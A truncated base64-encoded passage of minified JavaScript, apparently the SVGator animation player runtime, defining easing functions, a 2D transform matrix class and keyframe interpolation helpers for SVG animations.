iE9dHlwZW9mIGdsb2JhbFRoaXM/Z2xvYmFsVGhpczp0fHxzZWxmKS5fX1NWR0FUT1JfUExBWUVSX189dC5fX1NWR0FUT1JfUExBWUVSX198fHt9LHQuX19TVkdBVE9SX1BMQVlFUl9fWyI5MWM4MGQ3NyJdPW4oKSl9KHRoaXMsKGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHQodCxuKXt2YXIgZT1PYmplY3Qua2V5cyh0KTtpZihPYmplY3QuZ2V0T3duUHJvcGVydHlTeW1ib2xzKXt2YXIgcj1PYmplY3QuZ2V0T3duUHJvcGVydHlTeW1ib2xzKHQpO24mJihyPXIuZmlsdGVyKChmdW5jdGlvbihuKXtyZXR1cm4gT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcih0LG4pLmVudW1lcmFibGV9KSkpLGUucHVzaC5hcHBseShlLHIpfXJldHVybiBlfWZ1bmN0aW9uIG4obil7Zm9yKHZhciBlPTE7ZTxhcmd1bWVudHMubGVuZ3RoO2UrKyl7dmFyIHI9bnVsbCE9YXJndW1lbnRzW2VdP2FyZ3VtZW50c1tlXTp7fTtlJTI/dChPYmplY3QociksITApLmZvckVhY2goKGZ1bmN0aW9uKHQpe28obix0LHJbdF0pfSkpOk9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3JzP09iamVjdC5kZWZpbmVQcm9wZXJ0aWVzKG4sT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcnMocikpOnQoT2JqZWN0KHIpKS5mb3JFYWNoKChmdW5jdGlvbih0KXtPYmplY3QuZGVmaW5lUHJvcGVydHkobix0LE9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3Iocix0KSl9KSl9cmV0dXJuIG59ZnVuY3Rpb24gZSh0KXtyZXR1cm4oZT0iZnVuY3Rpb24iPT10eXBlb2YgU3ltYm9sJiYic3ltYm9sIj09dHlwZW9mIFN5bWJvbC5pdGVyYXRvcj9mdW5jdGlvbih0KXtyZXR1cm4gdHlwZW9mIHR9OmZ1bmN0aW9uKHQpe3JldHVybiB0JiYiZnVuY3Rpb24iPT10eXBlb2YgU3ltYm9sJiZ0LmNvbnN0cnVjdG9yPT09U3ltYm9sJiZ0IT09U3ltYm9sLnByb3RvdHlwZT8ic3ltYm9sIjp0eXBlb2YgdH0pKHQpfWZ1bmN0aW9uIHIodCxuKXtpZighKHQgaW5zdGFuY2VvZiBuKSl0aHJvdyBuZXcgVHlwZUVycm9yKCJDYW5ub3QgY2FsbCBhIGNsYXNzIGFzIGEgZnVuY3Rpb24iKX1mdW5jdGlvbiBpKHQsbil7Zm9yKHZhciBlPTA7ZTxuLmxlbmd0aDtlKyspe3ZhciByPW5bZV07ci5lbnVtZXJhYmxlPXIuZW51bWVyYWJsZXx8ITEsci5jb25maWd1cmFibGU9ITAsInZhbHVlImluIHImJihyLndyaXRhYmxlPSEwKSxPYmplY3QuZGVmaW5lUHJvcGVydHkodCxyLmtleSxyKX19ZnVuY3Rpb24gdSh0LG4sZSl7cmV0dXJuIG4mJmkodC5wcm90b3R5cGUsbiksZSYmaSh0LGUpLHR9ZnVuY3Rpb24gbyh0LG4sZSl7cmV0dXJuIG4gaW4gdD9PYmplY3QuZGVmaW5lUHJvcGVydHkodCxuLHt2YWx1ZTplLGVudW1lcmFibGU6ITAsY29uZmlndXJhYmxlOiEwLHdyaXRhYmxlOiEwfSk6dFtuXT1lLHR9ZnVuY3Rpb24gYSh0KXtyZXR1cm4oYT1PYmplY3Quc2V0UHJvdG90eXBlT2Y/T2JqZWN0LmdldFByb3RvdHlwZU9mOmZ1bmN0aW9uKHQpe3JldHVybiB0Ll9fcHJvdG9fX3x8T2JqZWN0LmdldFByb3RvdHlwZU9mKHQpfSkodCl9ZnVuY3Rpb24gbCh0LG4pe3JldHVybihsPU9iamVjdC5zZXRQcm90b3R5cGVPZnx8ZnVuY3Rpb24odCxuKXtyZXR1cm4gdC5fX3Byb3RvX189bix0fSkodCxuKX1mdW5jdGlvbiBzKCl7aWYoInVuZGVmaW5lZCI9PXR5cGVvZiBSZWZsZWN0fHwhUmVmbGVjdC5jb25zdHJ1Y3QpcmV0dXJuITE7aWYoUmVmbGVjdC5jb25zdHJ1Y3Quc2hhbSlyZXR1cm4hMTtpZigiZnVuY3Rpb24iPT10eXBlb2YgUHJveHkpcmV0dXJuITA7dHJ5e3JldHVybiBCb29sZWFuLnByb3RvdHlwZS52YWx1ZU9mLmNhbGwoUmVmbGVjdC5jb25zdHJ1Y3QoQm9vbGVhbixbXSwoZnVuY3Rpb24oKXt9KSkpLCEwfWNhdGNoKHQpe3JldHVybiExfX1mdW5jdGlvbiBmKHQsbixlKXtyZXR1cm4oZj1zKCk/UmVmbGVjdC5jb25zdHJ1Y3Q6ZnVuY3Rpb24odCxuLGUpe3ZhciByPVtudWxsXTtyLnB1c2guYXBwbHkocixuKTt2YXIgaT1uZXcoRnVuY3Rpb24uYmluZC5hcHBseSh0LHIpKTtyZXR1cm4gZSYmbChpLGUucHJvdG90eXBlKSxpfSkuYXBwbHkobnVsbCxhcmd1bWVudHMpfWZ1bmN0aW9uIGModCxuKXtpZihuJiYoIm9iamVjdCI9PXR5cGVvZiBufHwiZnVuY3Rpb24iPT10eXBlb2YgbikpcmV0dXJuIG47aWYodm9pZCAwIT09bil0aHJvdyBuZXcgVHlwZUVycm9yKCJEZXJpdmVkIGNvbnN0cnVjdG9ycyBtYXkgb25seSByZXR1cm4gb2JqZWN0IG9yIHVuZGVmaW5lZCIpO3JldHVybiBmdW5jdGlvbih0KXtpZih2b2lkIDA9PT10KXRocm93IG5ldyBSZWZlcmVuY2VFcnJvcigidGhpcyBoYXNuJ3QgYmVlbiBpbml0aWFsaXNlZCAtIHN1cGVyKCkgaGFzbid0IGJlZW4gY2FsbGVkIik7cmV0dXJuIHR9KHQpfWZ1bmN0aW9uIGgodCxuLGUpe3JldHVybihoPSJ1bmRlZmluZWQiIT10eXBlb2YgUmVmbGVjdCYmUmVmbGVjdC5nZXQ/UmVmbGVjdC5nZXQ6ZnVuY3Rpb24odCxuLGUpe3ZhciByPWZ1bmN0aW9uKHQsbil7Zm9yKDshT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKHQsbikmJm51bGwhPT0odD1hKHQpKTspO3JldHVybiB0fSh0LG4pO2lmKHIpe3ZhciBpPU9iamVjdC5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IocixuKTtyZXR1cm4gaS5nZXQ/aS5nZXQuY2FsbChlKTppLnZhbHVlfX0pKHQsbixlfHx0KX1mdW5jdGlvbiB2KHQpe3JldHVybiBmdW5jdGlvbih0KXtpZihBcnJheS5pc0FycmF5KHQpKXJldHVybiBkKHQpfSh0KXx8ZnVuY3Rpb24odCl7aWYoInVuZGVmaW5lZCIhPXR5cGVvZiBTeW1ib2wmJm51bGwhPXRbU3ltYm9sLml0ZXJhdG9yXXx8bnVsbCE9dFsiQEBpdGVyYXRvciJdKXJldHVybiBBcnJheS5mcm9tKHQpfSh0KXx8ZnVuY3Rpb24odCxuKXtpZighdClyZXR1cm47aWYoInN0cmluZyI9PXR5cGVvZiB0KXJldHVybiBkKHQsbik7dmFyIGU9T2JqZWN0LnByb3RvdHlwZS50b1N0cmluZy5jYWxsKHQpLnNsaWNlKDgsLTEpOyJPYmplY3QiPT09ZSYmdC5jb25zdHJ1Y3RvciYmKGU9dC5jb25zdHJ1Y3Rvci5uYW1lKTtpZigiTWFwIj09PWV8fCJTZXQiPT09ZSlyZXR1cm4gQXJyYXkuZnJvbSh0KTtpZigiQXJndW1lbnRzIj09PWV8fC9eKD86VWl8SSludCg/Ojh8MTZ8MzIpKD86Q2xhbXBlZCk/QXJyYXkkLy50ZXN0KGUpKXJldHVybiBkKHQsbil9KHQpfHxmdW5jdGlvbigpe3Rocm93IG5ldyBUeXBlRXJyb3IoIkludmFsaWQgYXR0ZW1wdCB0byBzcHJlYWQgbm9uLWl0ZXJhYmxlIGluc3RhbmNlLlxuSW4gb3JkZXIgdG8gYmUgaXRlcmFibGUsIG5vbi1hcnJheSBvYmplY3RzIG11c3QgaGF2ZSBhIFtTeW1ib2wuaXRlcmF0b3JdKCkgbWV0aG9kLiIpfSgpfWZ1bmN0aW9uIGQodCxuKXsobnVsbD09bnx8bj50Lmxlbmd0aCkmJihuPXQubGVuZ3RoKTtmb3IodmFyIGU9MCxyPW5ldyBBcnJheShuKTtlPG47ZSsrKXJbZV09dFtlXTtyZXR1cm4gcn12YXIgeT1nKE1hdGgucG93KDEwLC02KSk7ZnVuY3Rpb24gZyh0KXt2YXIgbj1hcmd1bWVudHMubGVuZ3RoPjEmJnZvaWQgMCE9PWFyZ3VtZW50c1sxXT9hcmd1bWVudHNbMV06NjtpZihOdW1iZXIuaXNJbnRlZ2VyKHQpKXJldHVybiB0O3ZhciBlPU1hdGgucG93KDEwLG4pO3JldHVybiBNYXRoLnJvdW5kKCgrdCtOdW1iZXIuRVBTSUxPTikqZSkvZX1mdW5jdGlvbiBwKHQsbil7dmFyIGU9YXJndW1lbnRzLmxlbmd0aD4yJiZ2b2lkIDAhPT1hcmd1bWVudHNbMl0/YXJndW1lbnRzWzJdOnk7cmV0dXJuIE1hdGguYWJzKHQtbik8ZX12YXIgbT1NYXRoLlBJLzE4MDtmdW5jdGlvbiBiKHQpe3JldHVybiB0fWZ1bmN0aW9uIHcodCxuLGUpe3ZhciByPTEtZTtyZXR1cm4gMyplKnIqKHQqcituKmUpK2UqZSplfWZ1bmN0aW9uIEEoKXt2YXIgdD1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MCxuPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXTowLGU9YXJndW1lbnRzLmxlbmd0aD4yJiZ2b2lkIDAhPT1hcmd1bWVudHNbMl0/YXJndW1lbnRzWzJdOjEscj1hcmd1bWVudHMubGVuZ3RoPjMmJnZvaWQgMCE9PWFyZ3VtZW50c1szXT9hcmd1bWVudHNbM106MTtyZXR1cm4gdDwwfHx0PjF8fGU8MHx8ZT4xP251bGw6cCh0LG4pJiZwKGUscik/YjpmdW5jdGlvbihpKXtpZihpPD0wKXJldHVybiB0PjA/aSpuL3Q6MD09PW4mJmU+MD9pKnIvZTowO2lmKGk+PTEpcmV0dXJuIGU8MT8xKyhpLTEpKihyLTEpLyhlLTEpOjE9PT1lJiZ0PDE/MSsoaS0xKSoobi0xKS8odC0xKToxO2Zvcih2YXIgdSxvPTAsYT0xO288YTspe3ZhciBsPXcodCxlLHU9KG8rYSkvMik7aWYocChpLGwpKWJyZWFrO2w8aT9vPXU6YT11fXJldHVybiB3KG4scix1KX19ZnVuY3Rpb24geCgpe3JldHVybiAxfWZ1bmN0aW9uIGsodCl7cmV0dXJuIDE9PT10PzE6MH1mdW5jdGlvbiBfKCl7dmFyIHQ9YXJndW1lbnRzLmxlbmd0aD4wJiZ2b2lkIDAhPT1hcmd1bWVudHNbMF0/YXJndW1lbnRzWzBdOjEsbj1hcmd1bWVudHMubGVuZ3RoPjEmJnZvaWQgMCE9PWFyZ3VtZW50c1sxXT9hcmd1bWVudHNbMV06MDtpZigxPT09dCl7aWYoMD09PW4pcmV0dXJuIGs7aWYoMT09PW4pcmV0dXJuIHh9dmFyIGU9MS90O3JldHVybiBmdW5jdGlvbih0KXtyZXR1cm4gdD49MT8xOih0Kz1uKmUpLXQlZX19dmFyIFM9TWF0aC5zaW4sTz1NYXRoLmNvcyxNPU1hdGguYWNvcyxFPU1hdGguYXNpbixqPU1hdGgudGFuLFA9TWF0aC5hdGFuMixJPU1hdGguUEkvMTgwLEI9MTgwL01hdGguUEksUj1NYXRoLnNxcnQsVD1mdW5jdGlvbigpe2Z1bmN0aW9uIHQoKXt2YXIgbj1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MSxlPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXTowLGk9YXJndW1lbnRzLmxlbmd0aD4yJiZ2b2lkIDAhPT1hcmd1bWVudHNbMl0/YXJndW1lbnRzWzJdOjAsdT1hcmd1bWVudHMubGVuZ3RoPjMmJnZvaWQgMCE9PWFyZ3VtZW50c1szXT9hcmd1bWVudHNbM106MSxvPWFyZ3VtZW50cy5sZW5ndGg+NCYmdm9pZCAwIT09YXJndW1lbnRzWzRdP2FyZ3VtZW50c1s0XTowLGE9YXJndW1lbnRzLmxlbmd0aD41JiZ2b2lkIDAhPT1hcmd1bWVudHNbNV0/YXJndW1lbnRzWzVdOjA7cih0aGlzLHQpLHRoaXMubT1bbixlLGksdSxvLGFdLHRoaXMuaT1udWxsLHRoaXMudz1udWxsLHRoaXMucz1udWxsfXJldHVybiB1KHQsW3trZXk6ImRldGVybWluYW50IixnZXQ6ZnVuY3Rpb24oKXt2YXIgdD10aGlzLm07cmV0dXJuIHRbMF0qdFszXS10WzFdKnRbMl19fSx7a2V5OiJpc0lkZW50aXR5IixnZXQ6ZnVuY3Rpb24oKXtpZihudWxsPT09dGhpcy5pKXt2YXIgdD10aGlzLm07dGhpcy5pPTE9PT10WzBdJiYwPT09dFsxXSYmMD09PXRbMl0mJjE9PT10WzNdJiYwPT09dFs0XSYmMD09PXRbNV19cmV0dXJuIHRoaXMuaX19LHtrZXk6InBvaW50Iix2YWx1ZTpmdW5jdGlvbih0LG4pe3ZhciBlPXRoaXMubTtyZXR1cm57eDplWzBdKnQrZVsyXSpuK2VbNF0seTplWzFdKnQrZVszXSpuK2VbNV19fX0se2tleToidHJhbnNsYXRlU2VsZiIsdmFsdWU6ZnVuY3Rpb24oKXt2YXIgdD1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MCxuPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXTowO2lmKCF0JiYhbilyZXR1cm4gdGhpczt2YXIgZT10aGlzLm07cmV0dXJuIGVbNF0rPWVbMF0qdCtlWzJdKm4sZVs1XSs9ZVsxXSp0K2VbM10qbix0aGlzLnc9dGhpcy5zPXRoaXMuaT1udWxsLHRoaXN9fSx7a2V5OiJyb3RhdGVTZWxmIix2YWx1ZTpmdW5jdGlvbigpe3ZhciB0PWFyZ3VtZW50cy5sZW5ndGg+MCYmdm9pZCAwIT09YXJndW1lbnRzWzBdP2FyZ3VtZW50c1swXTowO2lmKHQlPTM2MCl7dmFyIG49Uyh0Kj1JKSxlPU8odCkscj10aGlzLm0saT1yWzBdLHU9clsxXTtyWzBdPWkqZStyWzJdKm4sclsxXT11KmUrclszXSpuLHJbMl09clsyXSplLWkqbixyWzNdPXJbM10qZS11Km4sdGhpcy53PXRoaXMucz10aGlzLmk9bnVsbH1yZXR1cm4gdGhpc319LHtrZXk6InNjYWxlU2VsZiIsdmFsdWU6ZnVuY3Rpb24oKXt2YXIgdD1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MSxuPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXToxO2lmKDEhPT10fHwxIT09bil7dmFyIGU9dGhpcy5tO2VbMF0qPXQsZVsxXSo9dCxlWzJdKj1uLGVbM10qPW4sdGhpcy53PXRoaXMucz10aGlzLmk9bnVsbH1yZXR1cm4gdGhpc319LHtrZXk6InNrZXdTZWxmIix2YWx1ZTpmdW5jdGlvbih0LG4pe2lmKG4lPTM2MCwodCU9MzYwKXx8bil7dmFyIGU9dGhpcy5tLHI9ZVswXSxpPWVbMV0sdT1lWzJdLG89ZVszXTt0JiYodD1qKHQqSSksZVsyXSs9cip0LGVbM10rPWkqdCksbiYmKG49aihuKkkpLGVbMF0rPXUqbixlWzFdKz1vKm4pLHRoaXMudz10aGlzLnM9dGhpcy5pPW51bGx9cmV0dXJuIHRoaXN9fSx7a2V5OiJyZXNldFNlbGYiLHZhbHVlOmZ1bmN0aW9uKCl7dmFyIHQ9YXJndW1lbnRzLmxlbmd0aD4wJiZ2b2lkIDAhPT1hcmd1bWVudHNbMF0/YXJndW1lbnRzWzBdOjEsbj1hcmd1bWVudHMubGVuZ3RoPjEmJnZvaWQgMCE9PWFyZ3VtZW50c1sxXT9hcmd1bWVudHNbMV06MCxlPWFyZ3VtZW50cy5sZW5ndGg+MiYmdm9pZCAwIT09YXJndW1lbnRzWzJdP2FyZ3VtZW50c1syXTowLHI9YXJndW1lbnRzLmxlbmd0aD4zJiZ2b2lkIDAhPT1hcmd1bWVudHNbM10/YXJndW1lbnRzWzNdOjEsaT1hcmd1bWVudHMubGVuZ3RoPjQmJnZvaWQgMCE9PWFyZ3VtZW50c1s0XT9hcmd1bWVudHNbNF06MCx1PWFyZ3VtZW50cy5sZW5ndGg+NSYmdm9pZCAwIT09YXJndW1lbnRzWzVdP2FyZ3VtZW50c1s1XTowLG89dGhpcy5tO3JldHVybiBvWzBdPXQsb1sxXT1uLG9bMl09ZSxvWzNdPXIsb1s0XT1pLG9bNV09dSx0aGlzLnc9dGhpcy5zPXRoaXMuaT1udWxsLHRoaXN9fSx7a2V5OiJyZWNvbXBvc2VTZWxmIix2YWx1ZTpmdW5jdGlvbigpe3ZhciB0PWFyZ3VtZW50cy5sZW5ndGg+MCYmdm9pZCAwIT09YXJndW1lbnRzWzBdP2FyZ3VtZW50c1swXTpudWxsLG49YXJndW1lbnRzLmxlbmd0aD4xJiZ2b2lkIDAhPT1hcmd1bWVudHNbMV0/YXJndW1lbnRzWzFdOm51bGwsZT1hcmd1bWVudHMubGVuZ3RoPjImJnZvaWQgMCE9PWFyZ3VtZW50c1syXT9hcmd1bWVudHNbMl06bnVsbCxyPWFyZ3VtZW50cy5sZW5ndGg+MyYmdm9pZCAwIT09YXJndW1lbnRzWzNdP2FyZ3VtZW50c1szXTpudWxsLGk9YXJndW1lbnRzLmxlbmd0aD40JiZ2b2lkIDAhPT1hcmd1bWVudHNbNF0/YXJndW1lbnRzWzRdOm51bGw7cmV0dXJuIHRoaXMuaXNJZGVudGl0eXx8dGhpcy5yZXNldFNlbGYoKSx0JiYodC54fHx0LnkpJiZ0aGlzLnRyYW5zbGF0ZVNlbGYodC54LHQueSksbiYmdGhpcy5yb3RhdGVTZWxmKG4pLGUmJihlLngmJnRoaXMuc2tld1NlbGYoZS54LDApLGUueSYmdGhpcy5za2V3U2VsZigwLGUueSkpLCFyfHwxPT09ci54JiYxPT09ci55fHx0aGlzLnNjYWxlU2VsZihyLngsci55KSxpJiYoaS54fHxpLnkpJiZ0aGlzLnRyYW5zbGF0ZVNlbGYoaS54LGkueSksdGhpc319LHtrZXk6ImRlY29tcG9zZSIsdmFsdWU6ZnVuY3Rpb24oKXt2YXIgdD1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MCxuPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXTowLGU9dGhpcy5tLHI9ZVswXSplWzBdK2VbMV0qZVsxXSxpPVtbZVswXSxlWzFdXSxbZVsyXSxlWzNdXV0sdT1SKHIpO2lmKDA9PT11KXJldHVybntvcmlnaW46e3g6ZyhlWzRdKSx5OmcoZVs1XSl9LHRyYW5zbGF0ZTp7eDpnKHQpLHk6ZyhuKX0sc2NhbGU6e3g6MCx5OjB9LHNrZXc6e3g6MCx5OjB9LHJvdGF0ZTowfTtpWzBdWzBdLz11LGlbMF1bMV0vPXU7dmFyIG89ZVswXSplWzNdLWVbMV0qZVsyXTwwO28mJih1PS11KTt2YXIgYT1pWzBdWzBdKmlbMV1bMF0raVswXVsxXSppWzFdWzFdO2lbMV1bMF0tPWlbMF1bMF0qYSxpWzFdWzFdLT1pWzBdWzFdKmE7dmFyIGw9UihpWzFdWzBdKmlbMV1bMF0raVsxXVsxXSppWzFdWzFdKTtpZigwPT09bClyZXR1cm57b3JpZ2luOnt4OmcoZVs0XSkseTpnKGVbNV0pfSx0cmFuc2xhdGU6e3g6Zyh0KSx5Omcobil9LHNjYWxlOnt4OmcodSkseTowfSxza2V3Ont4OjAseTowfSxyb3RhdGU6MH07aVsxXVswXS89bCxpWzFdWzFdLz1sLGEvPWw7dmFyIHM9MDtyZXR1cm4gaVsxXVsxXTwwPyhzPU0oaVsxXVsxXSkqQixpWzBdWzFdPDAmJihzPTM2MC1zKSk6cz1FKGlbMF1bMV0pKkIsbyYmKHM9LXMpLGE9UChhLFIoaVswXVswXSppWzBdWzBdK2lbMF1bMV0qaVswXVsxXSkpKkIsbyYmKGE9LWEpLHtvcmlnaW46e3g6ZyhlWzRdKSx5OmcoZVs1XSl9LHRyYW5zbGF0ZTp7eDpnKHQpLHk6ZyhuKX0sc2NhbGU6e3g6Zyh1KSx5OmcobCl9LHNrZXc6e3g6ZyhhKSx5OjB9LHJvdGF0ZTpnKHMpfX19LHtrZXk6ImNsb25lIix2YWx1ZTpmdW5jdGlvbigpe3ZhciB0PXRoaXMubTtyZXR1cm4gbmV3IHRoaXMuY29uc3RydWN0b3IodFswXSx0WzFdLHRbMl0sdFszXSx0WzRdLHRbNV0pfX0se2tleToidG9TdHJpbmciLHZhbHVlOmZ1bmN0aW9uKCl7dmFyIHQ9YXJndW1lbnRzLmxlbmd0aD4wJiZ2b2lkIDAhPT1hcmd1bWVudHNbMF0/YXJndW1lbnRzWzBdOiIgIjtyZXR1cm4gbnVsbD09PXRoaXMucyYmKHRoaXMucz0ibWF0cml4KCIrdGhpcy5tLm1hcCgoZnVuY3Rpb24odCl7cmV0dXJuIGcodCl9KSkuam9pbih0KSsiKSIpLHRoaXMuc319XSxbe2tleToiY3JlYXRlIix2YWx1ZTpmdW5jdGlvbih0KXtyZXR1cm4gdD9BcnJheS5pc0FycmF5KHQpP2YodGhpcyx2KHQpKTp0IGluc3RhbmNlb2YgdGhpcz90LmNsb25lKCk6KG5ldyB0aGlzKS5yZWNvbXBvc2VTZWxmKHQub3JpZ2luLHQucm90YXRlLHQuc2tldyx0LnNjYWxlLHQudHJhbnNsYXRlKTpuZXcgdGhpc319XSksdH0oKTtmdW5jdGlvbiBOKHQsbixlKXtyZXR1cm4gdD49LjU/ZTpufWZ1bmN0aW9uIEModCxuLGUpe3JldHVybiAwPT09dHx8bj09PWU/bjp0KihlLW4pK259ZnVuY3Rpb24gRih0LG4sZSl7dmFyIHI9Qyh0LG4sZSk7cmV0dXJuIHI8PTA/MDpyfWZ1bmN0aW9uIEwodCxuLGUpe3ZhciByPUModCxuLGUpO3JldHVybiByPD0wPzA6cj49MT8xOnJ9ZnVuY3Rpb24gcSh0LG4sZSl7cmV0dXJuIDA9PT10P246MT09PXQ/ZTp7eDpDKHQsbi54LGUueCkseTpDKHQsbi55LGUueSl9fWZ1bmN0aW9uIFYodCxuLGUpe3JldHVybiAwPT09dD9uOjE9PT10P2U6e3g6Rih0LG4ueCxlLngpLHk6Rih0LG4ueSxlLnkpfX1mdW5jdGlvbiBEKHQsbixlKXt2YXIgcj1mdW5jdGlvbih0LG4sZSl7cmV0dXJuIE1hdGgucm91bmQoQyh0LG4sZSkpfSh0LG4sZSk7cmV0dXJuIHI8PTA/MDpyPj0yNTU/MjU1OnJ9ZnVuY3Rpb24geih0LG4sZSl7cmV0dXJuIDA9PT10P246MT09PXQ/ZTp7cjpEKHQsbi5yLGUuciksZzpEKHQsbi5nLGUuZyksYjpEKHQsbi5iLGUuYiksYTpDKHQsbnVsbD09bi5hPzE6bi5hLG51bGw9PWUuYT8xOmUuYSl9fWZ1bmN0aW9uIFkodCxuLGUpe3ZhciByPW4ubGVuZ3RoO2lmKHIhPT1lLmxlbmd0aClyZXR1cm4gTih0LG4sZSk7Zm9yKHZhciBpPW5ldyBBcnJheShyKSx1PTA7dTxyO3UrKylpW3VdPUModCxuW3VdLGVbdV0pO3JldHVybiBpfWZ1bmN0aW9uIEcodCxuKXtmb3IodmFyIGU9W10scj0wO3I8dDtyKyspZS5wdXNoKG4pO3JldHVybiBlfWZ1bmN0aW9uIFUodCxuKXtpZigtLW48PTApcmV0dXJuIHQ7dmFyIGU9KHQ9T2JqZWN0LmFzc2lnbihbXSx0KSkubGVuZ3RoO2Rve2Zvcih2YXIgcj0wO3I8ZTtyKyspdC5wdXNoKHRbcl0pfXdoaWxlKC0tbj4wKTtyZXR1cm4gdH12YXIgJCxXPWZ1bmN0aW9uKCl7ZnVuY3Rpb24gdChuKXtyKHRoaXMsdCksdGhpcy5saXN0PW4sdGhpcy5sZW5ndGg9bi5sZW5ndGh9cmV0dXJuIHUodCxbe2tleToic2V0QXR0cmlidXRlIix2YWx1ZTpmdW5jdGlvbih0LG4pe2Zvcih2YXIgZT10aGlzLmxpc3Qscj0wO3I8dGhpcy5sZW5ndGg7cisrKWVbcl0uc2V0QXR0cmlidXRlKHQsbil9fSx7a2V5OiJyZW1vdmVBdHRyaWJ1dGUiLHZhbHVlOmZ1bmN0aW9uKHQpe2Zvcih2YXIgbj10aGlzLmxpc3QsZT0wO2U8dGhpcy5sZW5ndGg7ZSsrKW5bZV0ucmVtb3ZlQXR0cmlidXRlKHQpfX0se2tleToic3R5bGUiLHZhbHVlOmZ1bmN0aW9uKHQsbil7Zm9yKHZhciBlPXRoaXMubGlzdCxyPTA7cjx0aGlzLmxlbmd0aDtyKyspZVtyXS5zdHlsZVt0XT1ufX1dKSx0fSgpLEg9Ly0uL2csUT1mdW5jdGlvbih0LG4pe3JldHVybiBuLnRvVXBwZXJDYXNlKCl9O2Z1bmN0aW9uIFgodCl7cmV0dXJuImZ1bmN0aW9uIj09dHlwZW9mIHQ/dDpOfWZ1bmN0aW9uIEoodCl7cmV0dXJuIHQ/ImZ1bmN0aW9uIj09dHlwZW9mIHQ/dDpBcnJheS5pc0FycmF5KHQpP2Z1bmN0aW9uKHQpe3ZhciBuPWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXTpiO2lmKCFBcnJheS5pc0FycmF5KHQpKXJldHVybiBuO3N3aXRjaCh0Lmxlbmd0aCl7Y2FzZSAxOnJldHVybiBfKHRbMF0pfHxuO2Nhc2UgMjpyZXR1cm4gXyh0WzBdLHRbMV0pfHxuO2Nhc2UgNDpyZXR1cm4gQSh0WzBdLHRbMV0sdFsyXSx0WzNdKXx8bn1yZXR1cm4gbn0odCxudWxsKTpmdW5jdGlvbih0LG4pe3ZhciBlPWFyZ3VtZW50cy5sZW5ndGg+MiYmdm9pZCAwIT09YXJndW1lbnRzWzJdP2FyZ3VtZW50c1syXTpiO3N3aXRjaCh0KXtjYXNlImxpbmVhciI6cmV0dXJuIGI7Y2FzZSJzdGVwcyI6cmV0dXJuIF8obi5zdGVwc3x8MSxuLmp1bXB8fDApfHxlO2Nhc2UiYmV6aWVyIjpjYXNlImN1YmljLWJlemllciI6cmV0dXJuIEEobi54MXx8MCxuLnkxfHwwLG4ueDJ8fDAsbi55Mnx8MCl8fGV9cmV0dXJuIGV9KHQudHlwZSx0LnZhbHVlLG51bGwpOm51bGx9ZnVuY3Rpb24gWih0LG4sZSl7dmFyIHI9YXJndW1lbnRzLmxlbmd0aD4zJiZ2b2lkIDAhPT1hcmd1bWVudHNbM10mJmFyZ3VtZW50c1szXSxpPW4ubGVuZ3RoLTE7aWYodDw9blswXS50KXJldHVybiByP1swLDAsblswXS52XTpuWzBdLnY7aWYodD49bltpXS50KXJldHVybiByP1tpLDEsbltpXS52XTpuW2ldLnY7dmFyIHUsbz1uWzBdLGE9bnVsbDtmb3IodT0xO3U8PWk7dSsrKXtpZighKHQ+blt1XS50KSl7YT1uW3VdO2JyZWFrfW89blt1XX1yZXR1cm4gbnVsbD09YT9yP1tpLDEsbltpXS52XTpuW2ldLnY6by50PT09YS50P3I/W3UsMSxhLnZdOmEudjoodD0odC1vLnQpLyhhLnQtby50KSxvLmUmJih0PW8uZSh0KSkscj9bdSx0LGUodCxvLnYsYS52KV06ZSh0LG8udixhLnYpKX1mdW5jdGlvbiBLKHQsbil7dmFyIGU9YXJndW1lbnRzLmxlbmd0aD4yJiZ2b2lkIDAhPT1hcmd1bWVudHNbMl0/YXJndW1lbnRzWzJdOm51bGw7cmV0dXJuIHQmJnQubGVuZ3RoPyJmdW5jdGlvbiIhPXR5cGVvZiBuP251bGw6KCJmdW5jdGlvbiIhPXR5cGVvZiBlJiYoZT1udWxsKSxmdW5jdGlvbihyKXt2YXIgaT1aKHIsdCxuKTtyZXR1cm4gbnVsbCE9aSYmZSYmKGk9ZShpKSksaX0pOm51bGx9ZnVuY3Rpb24gdHQodCxuKXtyZXR1cm4gdC50LW4udH1mdW5jdGlvbiBudCh0LG4scixpLHUpe3ZhciBvLGE9IkAiPT09clswXSxsPSIjIj09PXJbMF0scz0kW3JdLGY9Tjtzd2l0Y2goYT8obz1yLnN1YnN0cigxKSxyPW8ucmVwbGFjZShILFEpKTpsJiYocj1yLnN1YnN0cigxKSksZShzKSl7Y2FzZSJmdW5jdGlvbiI6aWYoZj1zKGksdSxaLEoscixhLG4sdCksbClyZXR1cm4gZjticmVhaztjYXNlInN0cmluZyI6Zj1LKGksWChzKSk7YnJlYWs7Y2FzZS